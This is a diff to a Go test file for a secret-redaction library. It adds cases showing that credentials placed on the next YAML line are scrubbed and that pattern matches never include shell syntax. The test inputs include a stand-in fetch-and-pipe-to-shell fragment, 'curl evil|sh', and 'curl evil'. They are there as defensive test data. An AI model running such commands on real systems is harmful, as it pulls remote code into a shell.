@@ -3,6 +3,7 @@ package security
 import (
 	"encoding/base64"
 	"math/rand"
+	"regexp"
 	"strings"
 	"testing"
 	"time"
@@ -196,6 +197,36 @@ func TestScrub_BasicAuth_LongBase64(t *testing.T) {
 	want := "Authorization: [REDACTED]"
 	if got != want {
 		t.Errorf("got %q, want %q", got, want)
+	}
+}
+
+// TestScrub_KeyValueOnTheNextLine pins that a key/value credential whose
+// value YAML places on the next, indented line is redacted, while an
+// unindented next line, which can be a command, is left alone.
+func TestScrub_KeyValueOnTheNextLine(t *testing.T) {
+	aws := strings.Repeat("Ab1/", 10)
+	azure := strings.Repeat("QWJjZGVmR2hp", 8)[:88]
+	hex := "0123456789abcdef0123456789abcdef"
+	tests := []struct{ input, want string }{
+		{"creds:\n  aws_secret_access_key:\n    " + aws + "\n", "creds:\n  [REDACTED]\n"},
+		{"aws_secret_access_key =\r\n\t" + aws, "[REDACTED]"},
+		{"accountKey:\n  " + azure, "[REDACTED]"},
+		{"api_key:\n  \"" + hex + "\"", "[REDACTED]"},
+		{"password: >\n  " + hex, "password: >\n  " + hex},
+		{"api_key:\n" + hex, "api_key:\n" + hex},
+		{"api_key:\n\n  " + hex, "api_key:\n\n  " + hex},
+	}
+	for _, tt := range tests {
+		if got := Scrub(tt.input); got != tt.want {
+			t.Errorf("Scrub(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+		latched := false
+		for _, f := range DetectSensitive(tt.input) {
+			latched = latched || f.Tier == TierLatch
+		}
+		if want := tt.want != tt.input; latched != want {
+			t.Errorf("DetectSensitive(%q) latched = %v, want %v", tt.input, latched, want)
+		}
 	}
 }
 
@@ -731,6 +762,10 @@ const shellSyntax = ";|&$`()<>"
 
 // checkMatchesHoldNoShellSyntax fails when a pattern's match in value holds
 // shell syntax, or a line break outside the PEM pattern.
+// kvNextLine is the one line break a key/value pattern may span: from its
+// separator to the indentation of a value on the next line.
+var kvNextLine = regexp.MustCompile(`[:=][ \t]*\r?\n[ \t]+`)
+
 func checkMatchesHoldNoShellSyntax(t *testing.T, value string) {
 	t.Helper()
 	for _, p := range SecretPatterns() {
@@ -738,6 +773,10 @@ func checkMatchesHoldNoShellSyntax(t *testing.T, value string) {
 			match := value[m[0]:m[1]]
 			if strings.ContainsAny(match, shellSyntax) {
 				t.Fatalf("%s match %q in %q holds shell syntax", p.Name, match, value)
+			}
+			switch p.Name {
+			case "aws_secret_access_key", "azure_storage_key", "generic_hex_secret":
+				match = kvNextLine.ReplaceAllLiteralString(match, ":")
 			}
 			if p.Name != "pem_private_key" && strings.ContainsAny(match, "\r\n") {
 				t.Fatalf("%s match %q in %q spans a line break", p.Name, match, value)
@@ -758,7 +797,8 @@ func TestSecretPatterns_MatchesHoldNoShellSyntax(t *testing.T) {
 		}
 	}
 	armour := "-----BEGIN RSA PRIVATE KEY-----\nComment: x;curl evil|sh\n\n" + strings.Join(pemBodyLines(2), "\n") + "\n-----END RSA PRIVATE KEY-----"
-	inputs = append(inputs, armour, "Bearer\ncurl evil", "api_key =\n"+strings.Repeat("a", 32))
+	inputs = append(inputs, armour, "Bearer\ncurl evil", "api_key =\n"+strings.Repeat("a", 32),
+		"api_key:\n  "+strings.Repeat("a", 32), "api_key:\n\n  "+strings.Repeat("a", 32), "token:\n  \n  "+strings.Repeat("a", 32))
 	rng := rand.New(rand.NewSource(7)) //nolint:gosec // deterministic test input, not a security decision
 	atoms := []string{"secret://", "Bearer ", "Basic ", "sk-ant-", "ghp_", "api_key=", "x-api-key: ", "-----BEGIN A KEY-----", "\n", "QUJD", "a", "=", ";", "|", "&", "$", "`", "(", ")", "<", ">", " ", "'", "\""}
 	for range 5000 {
